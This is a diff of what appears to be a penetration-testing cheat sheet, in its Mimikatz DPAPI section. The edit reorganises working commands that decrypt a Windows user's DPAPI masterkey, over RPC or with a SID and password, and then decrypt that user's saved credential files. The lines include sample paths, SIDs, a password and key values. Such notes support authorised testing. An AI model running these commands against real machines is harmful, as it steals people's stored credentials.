@@ -84,14 +84,13 @@ Mimikatz DPAPI
       mimikatz dpapi::cred /in:c:\users\epugh\AppData\Local\Microsoft\Credentials\936A68B5AC87C545C4A22D1AF264C8E9 /masterkey:dcd70638e50e3bcec7cd7fb8......
       
   Examples of user level decryption    
-	MasterKey first needs to be decrypted
-	1) User rpc
-	  a) mimikatz dpapi::masterkey /in:"C:\Users\patrick\AppData\Roaming\Microsoft\Protect\S-1-5-21-3183136678-2494426626-2580875802-1114\06bcd155-05fe-4791-937a-96c4282ea7f0" /rpc
-	2) Use sid + password
-	  a) mimikatz dpapi::masterkey /in:"C:\Users\patrick\AppData\Roaming\Microsoft\Protect\S-1-5-21-3183136678-2494426626-2580875802-1114\06bcd155-05fe-4791-937a-96c4282ea7f0" /sids:S-1-5-21-3183136678-2494426626-2580875802-1114 /password:Password123!@# /protected
-
-Once MasterKey is obtained you can decrypt
-mimikatz dpapi::cred /in:C:\Users\patrick\AppData\Local\Microsoft\Credentials\B2E4B345E6766BFF23FBC0BC6A1D9D2D /masterkey:d43567b71b2ece050a4d4f637b70d772a52bccc8ce79441928c35996e581ae0496b382a9f495b1bda34ed10bc115f68db9ca0c3e803c55a27d3776f82c6df425
+	1) MasterKey first needs to be decrypted (rpc or password)
+	  a) User rpc
+	     1) mimikatz dpapi::masterkey /in:"C:\Users\patrick\AppData\Roaming\Microsoft\Protect\S-1-5-21-3183136678-2494426626-2580875802-1114\06bcd155-05fe-4791-937a-96c4282ea7f0" /rpc
+	  b) Use password
+	     2) mimikatz dpapi::masterkey /in:"C:\Users\patrick\AppData\Roaming\Microsoft\Protect\S-1-5-21-3183136678-2494426626-2580875802-1114\06bcd155-05fe-4791-937a-96c4282ea7f0" /sids:S-1-5-21-3183136678-2494426626-2580875802-1114 /password:Password123!@# /protected
+	2) Once MasterKey is obtained you can decrypt
+	  a) mimikatz dpapi::cred /in:C:\Users\patrick\AppData\Local\Microsoft\Credentials\B2E4B345E6766BFF23FBC0BC6A1D9D2D /masterkey:8009e6c45447f2e4a5551f25c72338be95e68e15 (sha1)
 
 
 PowerView
